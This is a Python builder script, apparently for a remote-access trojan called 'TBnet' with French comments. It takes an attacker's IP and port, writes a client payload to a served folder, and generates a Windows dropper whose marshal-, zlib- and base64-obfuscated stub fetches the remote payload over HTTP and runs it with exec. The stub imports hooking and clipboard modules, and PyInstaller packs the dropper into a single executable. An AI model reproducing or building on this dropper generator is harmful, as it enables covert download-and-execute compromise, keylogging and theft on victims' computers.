import argparse
import subprocess
import os
import shutil
import base64
import zlib
import marshal

parser = argparse.ArgumentParser(description='TBnet Help Menu')
parser.add_argument('--host', type=str, required=True, dest='host',\
                    help='Ip du Server')
parser.add_argument('--port', type=int, required=True, dest='port',\
                    help='Port du Server')
parser.add_argument('--name', type=str, required=False, dest='name', default="client",\
                    help='Définir nom du fichier')
parser.add_argument('--persistance', type=bool, required=False, dest='persistance', default=False,\
                    help='Active la persistance automatique')

args = parser.parse_args()

class GenClient:

    pathDirFichier = "./code/"
    pathDirOutput = "./output/"
    pathDirHttp = "./http/"

    def GenererClient(self, ip, port, persistance, name):
        if not os.path.exists(self.pathDirOutput):
            os.makedirs(self.pathDirOutput)
        if not os.path.exists(self.pathDirHttp):
            os.makedirs(self.pathDirHttp)
        fichier = open(self.pathDirHttp + name + ".pyw", "w")
        fichier.write(self.ReturnFichier("payload1.txt"))
        fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
        fichier.write(self.ReturnFichier("payload2.txt"))
        fichier.close()
        fichier = open(self.pathDirOutput + "drop_" + name + ".pyw", "w")
        url = "\"http://" + ip + ":" + str(port + 1) + "/" + name + ".pyw\""
        print(url)
        ## import sys,zlib,base64,marshal,json,urllib
        dropper = """import sys,zlib,base64,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid
from win32com.makegw.makegwparse import *
from ctypes import *
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(url),2)))))
        print(dropper)
        fichier.write(dropper)
        fichier.close()
        os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "drop_" + name + ".pyw" + " -F --clean")
        print("Compilation terminer")
        print("Nettoyage des fichier temporaire")
        if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
            os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
        if os.path.exists("drop_" + name + ".spec"):
            os.remove("drop_" + name + ".spec")
        shutil.copyfile("dist/" + "drop_" + name + ".exe", self.pathDirOutput + name + ".exe")
        shutil.rmtree("dist/")
        shutil.rmtree("build/")
        shutil.rmtree("output/__pycache__")
        print("Client executable prêt : output/" + name + ".exe")

        

    def ReturnFichier(self, nom_fichier):
        fichier = open(self.pathDirFichier + nom_fichier, "r")
        text = fichier.read()
        fichier.close()
        return text
        

GenClient().GenererClient(args.host, args.port, args.persistance, args.name)

